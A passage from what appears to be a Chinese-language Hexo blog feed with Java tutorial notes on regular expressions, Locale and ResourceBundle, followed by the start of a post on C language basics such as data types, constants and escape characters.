&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073941.jpg"                      alt="image-20220921175400508"                ></p><p>​    需要注意的是，正则表达式无法对里面的内容进行判断，只能够对格式进行判断处理。</p><p>范例:判断给定的电话号码是否正确？</p><p>​    电话号码: 51283346; \\d{7,8}</p><p>​    电话号码: 01051283346; (\d{3,4})?\d{7,8}</p><p>​    电话号码: (010)-51283346。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//String类对正则的支持,字符串替换</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> three;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.text.ParseException;</span><br><span class="line"><span class="keyword">import</span> java.text.SimpleDateFormat;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test33</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ParseException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;01051283346&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">regex</span> <span class="operator">=</span> <span class="string">&quot;((\\d&#123;3,4&#125;)|(\\(\\d&#123;3,4&#125;\\)-))?\\d&#123;7,8&#125;&quot;</span>;</span><br><span class="line">        System.out.println(str.matches(regex)); <span class="comment">//true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>​    既然已经可以使用正则进行验证了，那么下面就可以利用其来实现一个 email 地址格式的验证。</p><p>范例:验证 email 格式</p><p>email 的用户名可以由字母、数字、_所组成; （不应该使用_开头）</p><p>email 的域名可以由字母、数字、_、-所组成;</p><p>域名的后缀必须是:.cn、.com、 .net、 .com.cn、 .gov;</p><p>“<a class="link"   href="mailto:&#x6d;&#108;&#100;&#110;&#106;&#x61;&#118;&#x61;&#56;&#x38;&#x38;&#64;&#109;&#x6c;&#x64;&#x6e;&#x2e;&#99;&#110;" >&#x6d;&#108;&#100;&#110;&#106;&#x61;&#118;&#x61;&#56;&#x38;&#x38;&#64;&#109;&#x6c;&#x64;&#x6e;&#x2e;&#99;&#110;<i class="fas fa-external-link-alt"></i></a>“</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073942.jpg"                      alt="image-20220921215053983"                ></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//String类对正则的支持,字符串替换</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> three;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.text.ParseException;</span><br><span class="line"><span class="keyword">import</span> java.text.SimpleDateFormat;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test33</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ParseException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;mldnjava888@mldn.cn&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">regex</span> <span class="operator">=</span> <span class="string">&quot;[a-zA-Z0-9]\\w+@\\w+\\.(cn|com|com.cm|net|gov)&quot;</span>;</span><br><span class="line">        System.out.println(str.matches(regex)); <span class="comment">//true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Java-util-regex开发包"><a href="#Java-util-regex开发包" class="headerlink" title="Java.util.regex开发包"></a>Java.util.regex开发包</h4><p>​    虽然在大部分的情况下都可以以利用 String 类实现正则的操作，但是也有一些情况下需要使用到 java.util.regex 开发包中提供的正则处理类。在这个包里面一共定义有两个类: Pattern (正则表达式编译)、Matcher (匹配)。</p><p>​    1、pattern 类提供有正则表达式的编译处理支持:<code> public static Pattern compile(String regex);</code>同时也提供有字符串的拆分操作: <code>public String[] split(CharSequence input);</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> three;</span><br><span class="line"></span><br><span class="line"><span class="comment">//java.util.regex开发包</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.regex.Pattern;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test34</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;jguigU()bfj&amp;%*JH*Y(*()BN NBCHTR^R&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">regex</span> <span class="operator">=</span> <span class="string">&quot;[^a-zA-Z0-9]+&quot;</span>;</span><br><span class="line">        <span class="type">Pattern</span> <span class="variable">pat</span> <span class="operator">=</span> Pattern.compile(regex); <span class="comment">//编译正则表达式</span></span><br><span class="line">        String[] result = pat.split(str); <span class="comment">//拆分</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> <span class="number">0</span>;x&lt; result.length;x++)&#123;</span><br><span class="line">            System.out.println(result[x]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> <img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073943.jpg"                      alt="image-20220921220918296"                ></p><p>​    2、Matcher 类，实现了正则匹配的处理类，这个类的对象实例化依靠 Pattern 类完成:</p><p>​    Pattern 类提供的方法: <code>public Matcher matcher(CharSequence input);</code></p><p>​    当获取了 Matcher 类的对象之后就可以利用该类中的方法进行如下操作:</p><p>​        正则匹配: public boolean matches();<br>​        字符串替换: public String replaceAIl(String replacement)</p><p>范例:字符串匹配.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> three;</span><br><span class="line"></span><br><span class="line"><span class="comment">//java.util.regex开发包</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.regex.Matcher;</span><br><span class="line"><span class="keyword">import</span> java.util.regex.Pattern;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test34</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;101&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">regex</span> <span class="operator">=</span> <span class="string">&quot;\\d+&quot;</span>;</span><br><span class="line">        <span class="type">Pattern</span> <span class="variable">pat</span> <span class="operator">=</span> Pattern.compile(regex); <span class="comment">//编译正则表达式</span></span><br><span class="line">        <span class="type">Matcher</span> <span class="variable">mat</span> <span class="operator">=</span> pat.matcher(str);</span><br><span class="line">        System.out.println(mat.matches()); <span class="comment">//true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    如果纯粹是以拆分，替换，匹配三种操作为例根本用不到 java.util.regex 开发包，只依靠 String 类就都可以实现了，但是 mather 类里面提供有一种分组的功能，而这种分组的功能是 String 不具备的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> three;</span><br><span class="line"></span><br><span class="line"><span class="comment">//java.util.regex开发包</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.regex.Matcher;</span><br><span class="line"><span class="keyword">import</span> java.util.regex.Pattern;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test34</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 要求取出&quot;#&#123;内容&#125;&quot;标记中的所有内容</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;INSERT INTO dept(deptno,dname,loc) VALUES (#&#123;deptno&#125;,#&#123;dname&#125;,#&#123;loc&#125;)&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">regex</span> <span class="operator">=</span> <span class="string">&quot;#\\&#123;\\w+\\&#125;&quot;</span>;</span><br><span class="line">        <span class="type">Pattern</span> <span class="variable">pat</span> <span class="operator">=</span> Pattern.compile(regex); <span class="comment">//编译正则表达式</span></span><br><span class="line">        <span class="type">Matcher</span> <span class="variable">mat</span> <span class="operator">=</span> pat.matcher(str);</span><br><span class="line">        <span class="keyword">while</span> (mat.find()) &#123; <span class="comment">//是否有匹配成功的内容</span></span><br><span class="line">            System.out.println(mat.group(<span class="number">0</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073944.jpg"                      alt="image-20220921223416269"                ></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> three;</span><br><span class="line"></span><br><span class="line"><span class="comment">//java.util.regex开发包</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.regex.Matcher;</span><br><span class="line"><span class="keyword">import</span> java.util.regex.Pattern;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test34</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 要求取出&quot;#&#123;内容&#125;&quot;标记中的所有内容</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;INSERT INTO dept(deptno,dname,loc) VALUES (#&#123;deptno&#125;,#&#123;dname&#125;,#&#123;loc&#125;)&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">regex</span> <span class="operator">=</span> <span class="string">&quot;#\\&#123;\\w+\\&#125;&quot;</span>;</span><br><span class="line">        <span class="type">Pattern</span> <span class="variable">pat</span> <span class="operator">=</span> Pattern.compile(regex); <span class="comment">//编译正则表达式</span></span><br><span class="line">        <span class="type">Matcher</span> <span class="variable">mat</span> <span class="operator">=</span> pat.matcher(str);</span><br><span class="line">        <span class="keyword">while</span> (mat.find()) &#123; <span class="comment">//是否有匹配成功的内容</span></span><br><span class="line">            System.out.println(mat.group(<span class="number">0</span>).replaceAll(<span class="string">&quot;#|\\&#123;|\\&#125;&quot;</span>,<span class="string">&quot;&quot;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073946.jpg"                      alt="image-20220921223602150"                ></p><p>​    java.util.regex 开发包，如果不是进行一些更为复杂的正则处理是很难使用到的，而String类所提供的功能只提供基本操作。</p><hr><h3 id="国际化程序实现"><a href="#国际化程序实现" class="headerlink" title="国际化程序实现"></a>国际化程序实现</h3><h4 id="国际化程序实现原理"><a href="#国际化程序实现原理" class="headerlink" title="国际化程序实现原理"></a>国际化程序实现原理</h4><p>​    所谓的国际化的程序指的是同一个程序代码可以根据不同的语言描述，但是程序处理的核心业务是相同的。</p><p>​    现在假设有一款世界都认可的企业管理平台，那么这个企业的老板决定将这个产品推广到世界各个大大型上市公司，于是这些公司可能来自于:中国、美国、德国，那么在这样的情况下，首先要考虑的问题是什么呢？</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073947.jpg"                      alt="image-20220922131509954"                ></p><p>​    通过分析得出的结论是，如果要想实现国际化的程序开发，那么要解决两个问题.</p><pre><code> ⑴如何可以定义保存文字的文件信息；  ⑵如何可以根据不同的区域语言的编码读取指定的资源信息。</code></pre><p>​    所谓的资源文件指的是后缀名称为“*properties”里面保存的内容按照“key=value”的形式保存，而且资源文件的命名标准与 Java 类完全一样。</p><h4 id="Locale类"><a href="#Locale类" class="headerlink" title="Locale类"></a>Locale类</h4><p>​    通过分析可以发现，如果要想实现国际化，那么首先需要解决的就是不同国家用户的区域和语言的编码问题，而在 java.util. 里面提供有一个专门描述区域和语言编码的类:Locale。而后主要可以使用 Locale 类中的两个构造方法进行实例化。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">构造方法: <span class="keyword">public</span> <span class="title function_">Locale</span><span class="params">(String language)</span>;</span><br><span class="line"></span><br><span class="line">构造方法: <span class="keyword">public</span> <span class="title function_">Locale</span><span class="params">( String language, String country)</span>;</span><br></pre></td></tr></table></figure><p>​    此时需要的是国家和语言的代码，而中文的代码:zh_CN、美国英语的代码: en _US,对于这些区域和语言的编码最佳获得广式就是通过IE浏览器。</p><p>范例:实例化 Locale 类对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="keyword">package</span> three;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Locale;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test35</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Locale</span> <span class="variable">loc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Locale</span>(<span class="string">&quot;zh&quot;</span>,<span class="string">&quot;CN&quot;</span>); <span class="comment">//中文</span></span><br><span class="line">        System.out.println(loc); <span class="comment">//zh_CN</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    如果说现在要想自动获得当前的运行环境，那么现在就可以利用 Locale 类本身默认的方式进行实例化。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">读取本地默认环境： <span class="keyword">public</span> <span class="keyword">static</span> Locale <span class="title function_">getDefault</span><span class="params">()</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="keyword">package</span> three;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Locale;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test35</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Locale</span> <span class="variable">loc</span> <span class="operator">=</span> Locale.getDefault();</span><br><span class="line">        System.out.println(loc); <span class="comment">//zh_CN_#Hans</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    在实际的开发过程之中，很多人可能并不关心国家和语言的编码，所以为了简化开发，Locale 也将世界上一些比较著名的国家的编码设置为了常量。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="keyword">package</span> three;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Locale;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test35</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Locale</span> <span class="variable">loc</span> <span class="operator">=</span> Locale.CHINA;</span><br><span class="line">        System.out.println(loc); <span class="comment">//zh_CN</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    使用常量的优势在于可以避免一些区城编码信息的繁琐。</p><h4 id="ResourceBundle读取资源文件"><a href="#ResourceBundle读取资源文件" class="headerlink" title="ResourceBundle读取资源文件"></a>ResourceBundle读取资源文件</h4><p>​    现在已经准备好资源文件，那么随后就需要进行资源文件的读取操作了，而读取资源文件主要依靠的是 java.util.ResourceBundle 类完成，此类定义如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">ResourceBundle</span> <span class="keyword">extends</span> <span class="title class_">Object</span></span><br></pre></td></tr></table></figure><p>​    ResoufcBundle 是一个抽象类，如果说现在要想进行此类对象的实例化可以直接利用该类中提供的一个静态方法完成。</p><p>​    获取 ResourceBundle 类对象: public static final ResourceBundle getBundle( String baseName); </p><p>​    baseName:描述的是资源文件的名称，但是没有后缀。<code>(cn.mldn.message.Messages);</code></p><p>​    根据key读取资源内容: public final String getString(String key);</p><p>定义资源文件：</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073948.jpg"                      alt="image-20220922141926607"                ></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">info=adbaufb</span><br></pre></td></tr></table></figure><p>​    这里面保存的 info 是这个信息的 key，以后要根据这个 key 取得对应的 value</p><p>范例:使用 ResourceBundle 类读取内容</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ResourceBundle读取资源文件</span></span><br><span class="line"><span class="keyword">package</span> three;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Locale;</span><br><span class="line"><span class="keyword">import</span> java.util.ResourceBundle;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test35</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">ResourceBundle</span> <span class="variable">resource</span> <span class="operator">=</span> ResourceBundle.getBundle(<span class="string">&quot;Messages&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">val</span> <span class="operator">=</span> resource.getString(<span class="string">&quot;info&quot;</span>);</span><br><span class="line">        System.out.println(val);<span class="comment">//adbaufb</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    如果资源没有放在包里面，则直接编写资源名称即可。</p><p>​    在进行资源读取的时候数据 的 key 一定要存在，如果不存在则会出现异常信息。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073949.jpg"                      alt="image-20220922143328494"                ></p><p>。。。。。。。。。。</p><p>未完</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;Java多线程编程&quot;&gt;&lt;a href=&quot;#Java多线程编程&quot; class=&quot;headerlink&quot; title=&quot;Java多线程编程&quot;&gt;&lt;/a&gt;Java多线程编程&lt;/h3&gt;&lt;p&gt;​    在Java语言里面最大的特点是支持多线程的开发(也是为数不多支持多线程的编</summary>
      
    
    
    
    <category term="Java安全基础篇" scheme="http://example.com/categories/Java%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E7%AF%87/"/>
    
    
    <category term="开发" scheme="http://example.com/tags/%E5%BC%80%E5%8F%91/"/>
    
    <category term="Java" scheme="http://example.com/tags/Java/"/>
    
    <category term="安全" scheme="http://example.com/tags/%E5%AE%89%E5%85%A8/"/>
    
    <category term="反射" scheme="http://example.com/tags/%E5%8F%8D%E5%B0%84/"/>
    
  </entry>
  
  <entry>
    <title>C🤪🤪🤪</title>
    <link href="http://example.com/2022/05/19/C%F0%9F%A4%AA%F0%9F%A4%AA%F0%9F%A4%AA/"/>
    <id>http://example.com/2022/05/19/C%F0%9F%A4%AA%F0%9F%A4%AA%F0%9F%A4%AA/</id>
    <published>2022-05-19T03:04:10.000Z</published>
    <updated>2023-04-15T07:44:20.238Z</updated>
    
    <content type="html"><![CDATA[<p>没有前言…</p><p>​    面向过程：C；</p><p>​    面向对象：C++，java，C#，objective-c；</p><p>​    C 语言是一种程序设计语言，具有高级语言的特点，有具有低级语言的特点，简洁灵活，使用方便，运用广泛。</p><h4 id="helloworld"><a href="#helloworld" class="headerlink" title="helloworld"></a>helloworld</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> * argv[])</span> &#123;</span><br><span class="line">    <span class="comment">// insert code here...</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello, World!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    stdio.h 系统库文件； #include导入头文件的预编译指令； &lt;&gt;系统自带的库； “”先搜索用户自定义库，再搜索系统库； main主函数，程序入口，只有一个。</p><hr><h4 id="C的数据类型"><a href="#C的数据类型" class="headerlink" title="C的数据类型"></a>C的数据类型</h4><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073409.jpg"                      alt="image-20220519121718761"                ></p><h5 id="整形"><a href="#整形" class="headerlink" title="整形"></a>整形</h5><p>​    整数，没有小数点的数，整型的值可以是整数、负数或者是0，但必须是整数。一般占4个字节（32位），取值范围是-21~=21亿。</p><p>​    包括短整型、整型和长整型。Short int  long int(两者的 int 可以省略，单用 short 和 long 表示)</p><h5 id="浮点型"><a href="#浮点型" class="headerlink" title="浮点型"></a>浮点型</h5><p>​    也叫实型，带有小数的数。C 语言中浮点包括 float 和 double 类型</p><p>​    系统的默认类型是 double，float 类型可精确表示的数字个数为7<del>8位，double 类型为16</del>17。（各操作系统一记编译器不同）</p><p>​    表示小数的形式：2^10  ^并不表示阶乘 而是表示位运算</p><h5 id="字符型char"><a href="#字符型char" class="headerlink" title="字符型char"></a>字符型char</h5><p>​    (用于表示字符)在计算机中使用二进制的 ASCII 码来存储</p><p>​    表现形式:用一对单引号括起来的单个字符‘a’(“ asd”字符串)</p><p>​    需注意数字是否有符号，以确定其范围。</p><hr><h4 id="常量和变量"><a href="#常量和变量" class="headerlink" title="常量和变量"></a>常量和变量</h4><p>​    常量：在程序执行过程中取值不可变的量称常量</p><h5 id="整型常量"><a href="#整型常量" class="headerlink" title="整型常量"></a>整型常量</h5><p>​    a)分为十进制，八进制 十六进制常量</p><p>​    b)八进制以整数0开头，用0-7表示数据</p><p>​    c)十六进制以0x 开头，用0-9和 ABCDEF 来表示数据</p><p><strong>实际常量</strong></p><p>​    d)十进制方式表示（0.123）</p><p>​    e)指数形式表示（10.123e5）</p><p><strong>字符型常量</strong></p><p>​    f)计算机用 ascll 码的形式来保存字符</p><p>​    g)使用单引号来表示（‘a’）</p><p>​    范例：A ——字符；1 ——数字；“abc”——字符串</p><p><strong>字符串常量</strong></p><p>​    h)用双引号括起来的字符序列（“hello”）</p><p>​    i)转义字符：是特殊字符常量，起控制作用，在输出界面不显示</p><table><thead><tr><th>转义字符</th><th>作用</th></tr></thead><tbody><tr><td>\a</td><td>响铃（BEL）</td></tr><tr><td>\b</td><td>退格(BS)</td></tr><tr><td>\f</td><td>换页（FF）</td></tr><tr><td>\n</td><td>换行（LF）</td></tr><tr><td>\r</td><td>回车（CR）</td></tr><tr><td>\t</td><td>水平制表（HT）</td></tr><tr><td>\v</td><td>垂直制表（VT）</td></tr><tr><td>\\</td><td>反斜杠</td></tr><tr><td>?</td><td>问号字符</td></tr><tr><td>\‘</td><td>单引号字符</td></tr><tr><td>\“</td><td>双引号字符</td></tr></tbody></table><p>​    <strong>注意，在内存单元中，如果按abc连续存储则指示单个的字符序列，而字符串都是以\0结尾的。字符串比看到的所占的内存单元多一个。</strong></p><h5 id="符号常量"><a href="#符号常量" class="headerlink" title="符号常量"></a>符号常量</h5><p>​    符号常量：用一个标识符来代表的常量</p><p>​    在使用之前要先定义，格式如下：# define 符号常量名 常量，用空格分隔，常量后面不加分号，例子：#define PI 3.141592653</p><p>​    符号常量的好处:1)书写程序时简单，不易出错；2)修改时方便；3)增加程序可读性(很明显 PI 表示圆周率)；4)符号常量习惯使用大写字母，例如：#define CLASSNUMBER 9</p><p>​    举例：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CLASSNUMBER 9</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> * argv[])</span> &#123;</span><br><span class="line">    <span class="comment">// insert code 